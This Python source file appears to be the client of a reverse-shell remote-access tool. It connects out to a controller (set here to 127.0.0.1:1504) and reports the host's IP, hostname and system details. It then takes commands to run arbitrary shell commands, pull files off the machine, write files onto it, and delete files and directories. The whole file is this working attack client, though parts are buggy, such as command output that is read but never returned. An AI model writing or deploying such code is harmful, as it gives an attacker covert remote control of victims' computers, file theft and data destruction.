import os
import sys
import time
import psutil
import shutil
import socket 
import zipfile
import platform 
import subprocess
from termcolor import colored


#----------Color Codex------------|
ERROR= colored('[-] ','red')     #|
SUCCESS= colored('[+] ','green') #|
NOTICE= colored('[!] ','yellow') #|
WAITING= colored('[?] ','blue')  #|
MAYBE= colored('[=] ','cyan')    #|

HOSTNAME= socket.gethostname()
IP= socket.gethostbyname(socket.gethostname())


def create_connection():
	global sett
	global CLIENT
	try:
		Host= '127.0.0.1'
		Port= 1504
		CLIENT= socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create socket instance like in the server.
		CLIENT.connect((Host,Port)) # Unlike the server you need to connect 'out' not bind into target machine.
		CLIENT.send(str.encode(IP+'@'+HOSTNAME+'~ > ')) # This is to give the .recv() listening on the server, the IP and HOSTNAME of the client.
	except Exception as err:
		print (err)
		#create_connection() # Retry connecting if something goes wrong.

def sysinfo():
	sysinfo = """
       <[-CLIENT--MACHINE--DETAILS-]>
    ===================================
    Name: %s
    FQDN: %s
    System Platform: %s
    Machine: %s
    Node: %s
    Platform: %s
    Processor: %s
    System OS: %s
    Release: %s
    Version: %s
            """ %(socket.gethostname(), socket.getfqdn(), sys.platform,platform.machine(),platform.node(),platform.platform(),platform.processor(),platform.system(),platform.release(),platform.version())
	sysinfo= colored(sysinfo,'green')
	CLIENT.send(str.encode(sysinfo))
#	socket.send(str.encode(sysinfo+'\n'))
#	socket.send(str.encode(IP+'@'+HOSTNAME+'~ > '))

def aux_file_trans_fuctn(byte_s):
	while (True):
		byte_s.read(1024)
		CLIENT.send(byte_s)
		if not byte_s:
			#print ('file bytes commletely sent')
			break
		byte_s.close()
		
def download():
	try:
		#socket.send(str.encode('download'))
		while True:
			file_S= CLIENT.recv(1024)
			file= CLIENT.recv(1024)
			if file.decode('utf-8').strip() != 'done': # correction made here
				try:
					file_size= int(file_S.decode('utf-8'))
					time.sleep(0.8)
					print (NOTICE+'File size: '+str(file_size))
				except:
					print ('\n')
					print (ERROR+'Error: File size could not be established.')
					print ('\n')
				drop_size= 0
				new= open('%s'%bytes.decode(file), 'wb')
				print ('\n')
				print (WAITING+"Downloading file: %s"%file.decode())
				while (True):   
					try:    
						file_bytes = CLIENT.recv(1024)
						drop_size= drop_size+len(file_bytes)
					except:
						print ('its here 1')
					new.write(file_bytes)
					if drop_size >= file_size:
						new.close()
						break  # break position switched.
						print (SUCCESS+'File upload chain broken.')
				new.close()
				time.sleep(1)
				print (SUCCESS+'Downloaded '+str(file)+' successfully.')
				print ('\n')
			elif file.decode('utf-8').strip()== 'done':
				print (SUCCESS+'File upload chain broken.')
				break
	except Exception as dnwld_fl_err:
		CLIENT.send(str.encode(ERROR+'File download_error: '+str(dnwld_fl_err)))


def upload():
	try:
		while True:
			global byte_s
			#print ('inside upload')
			file= CLIENT.recv(1024)
			#print ('waiting')
			if file.decode('utf-8').strip() != 'done':
				if os.path.isfile(file):
					file_size= str(os.path.getsize(file.decode('utf-8').strip())) # made change here
					#socket.send(str(file_size).encode('utf-8'))
					CLIENT.send(str.encode(file_size))
					try:
						#print (SUCCESS+'Reading file')
						byteS= open(file, 'rb')
						byte_s= byteS.read()
						try:
							#print (WAITING+'Sending file: '+str(file))
							#aux_file_trans_fuctn(byte_s)
							CLIENT.sendall(byte_s)
							#print (SUCCESS+'%s sent successfully' %str(file))
						except Exception as snd_fl_err:
							#print (ERROR+'Error sending file...')
							#print (ERROR+'aux_send function failed: '+str(snd_fl_err))
							pass 
						#CLIENT.sendfile(byte, 0)
						#try:
							#print (SUCCESS+'%s sent successfully' %str(file))
						#except:
							#pass
						byteS.close()

					except Exception as e:
						#print (e)
						pass
				elif not os.path.isfile(file):
					CLIENT.send(str.encode(ERROR+'No file named: '+file))
					break
			elif file.decode('utf-8').strip()== 'done':
				#print (SUCCESS+'File download chain broken.')
				break
	except Exception as snd_fl_err:
		CLIENT.send(str.encode(ERROR+'File upload_Error: '+ str(snd_fl_err)))


def communicate():
	create_connection()
	actions= 'upload', 'download', 'sysinfo'
	inputs= 'pwd', 'sysinfo', 'mkdir', 'cd', 'cd ..', 'dir', 'ls', 'quit'
	#sett= 'zip', 'unzip', 'pry'
	while True: # Because we want a recursive connection.
		try: 
			global drop
			drop= CLIENT.recv(1024) # Receive full buffer size.
			#if drop not in inputs:
			if len(drop)> 0:
				if drop[:3].decode('utf-8')== 'pwd':
					CLIENT.send(str.encode(' '+NOTICE+'Client current directory:'+'\n\n'+os.getcwd()+'\n'))
					#socket.send(str.encode(IP+'@'+HOSTNAME+'~ > '))

				elif drop[:5].decode('utf-8')== 'mkdir': # If 'mkdir' is passed, create directory with specified name.
					os.mkdir(drop[6:].decode('utf-8'))
					CLIENT.send(str.encode(' '+SUCCESS+'Directory: '+drop[6:].decode('utf-8')+' created in client.'))

				elif drop[:].decode('utf-8')== 'download': 
					upload()

				elif drop[:].decode('utf-8')== 'upload':
					download()

				elif drop[:3].decode('utf-8')== 'del':
					if os.path.isfile(drop[4:].decode('utf-8')):
						os.remove(drop[4:].decode('utf-8'))
						CLIENT.send(str.encode(SUCCESS+'File: '+drop[4:].decode('utf-8')+' deleted.'))
					elif os.path.isdir(drop[4:].decode('utf-8')):
						shutil.rmtree(drop[4:].decode('utf-8'))
						CLIENT.send(str.encode(SUCCESS+'Directory: '+drop[4:].decode('utf-8')+' deleted.'))
						#socket.send(str.encode(IP+'@'+HOSTNAME+'~ > ')) 

				elif drop[:2].decode('utf-8')=='cd': # This is to handle commands with no send back result like cd [just changes directory, nothing to send back].
					os.chdir(drop[3:].decode('utf-8')) # Above it checks for the 1st 2 characters of drop if they are 'cd' it checks from the 3rd character and moves into the dir spelt from the 3rd character. [Error if dir dont exist].
					CLIENT.send(str.encode(' '+NOTICE+'Client current directory:'+'\n'+os.getcwd()+'\n' ))
					#socket.send(str.encode(IP+'@'+HOSTNAME+'~ > '))
				
				elif drop[:].decode('utf-8')== 'cd ..':
					os.chdir(os.path.dirname(os.getcwd())) # Using os.path.dirname to migrate to the previous path with drop == 'cd ..'
					CLIENT.send(str.encode(' '+NOTICE+'Client current directory:'+'\n'+os.getcwd()+'\n' ))
					#socket.send(str.encode(IP+'@'+HOSTNAME+'~ > '))

				elif drop[:].decode('utf-8')== 'ls': # Lists all files in current directory when 'ls' is passed.
					dir_files=''
					try:
						for x in os.listdir(os.getcwd()):
							dir_files+= str(x+'\n')
						CLIENT.send(str.encode(' '+NOTICE+'Client current directory Contents:'+'\n\n'+str(dir_files+'\n' )))
							#socket.send(str.encode(IP+'@'+HOSTNAME+'~ > '))# If 'ls' is received, pass 'dir' to list items in directory.
					except Exception as ls_err:
						CLIENT.send(str.encode(ls_err))
						continue

				#elif drop[:4].decode('utf-8')== 'move': # Handles move file command.
				#	shutil.move(drop[5:].decode('utf-8'), drop[5:].decode('utf-8')) # Move the file / directory spelt from the 5th character.
				
				#elif drop[:4].decode('utf-8')== 'copy': # For copying 
				#	shutil.copy2(drop[5:].decode('utf-8')[0], drop[5:].decode('utf-8')[1])

				elif drop[:].decode('utf-8')== 'sysinfo':
					sysinfo()

				elif drop[:].decode('utf-8')== 'quit':
					CLIENT.close()
				
				elif drop[:].decode('utf-8') not in actions: 
					if not os.path.isfile(drop):
						if len(drop)> 0:
							#print ('Yes')
							Exec= subprocess.Popen(drop[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
							srv_incoming_byte= Exec.stdout.read() + Exec.stderr.read()
							srv_incoming_string= bytes.decode(srv_incoming_byte, 'utf-8') # Converts output from bytes to string.
							#socket.send(str.encode(srv_incoming_string+'\n'+IP+'@'+HOSTNAME+'~ > '))
							CLIENT.send(str.encode(IP+'@'+HOSTNAME+'~ > '))

			else:
				for _ in range(3):
					if len(drop)== 0:
						blank_cmd= MAYBE+'3 nulled bytes entries--> watch it!!'
						CLIENT.send(str.encode(blank_cmd))

		except Exception as cli_Err:
			CLIENT.send(str.encode(ERROR+'Client connection error: '+str(cli_Err)+'\n'))	

communicate()		

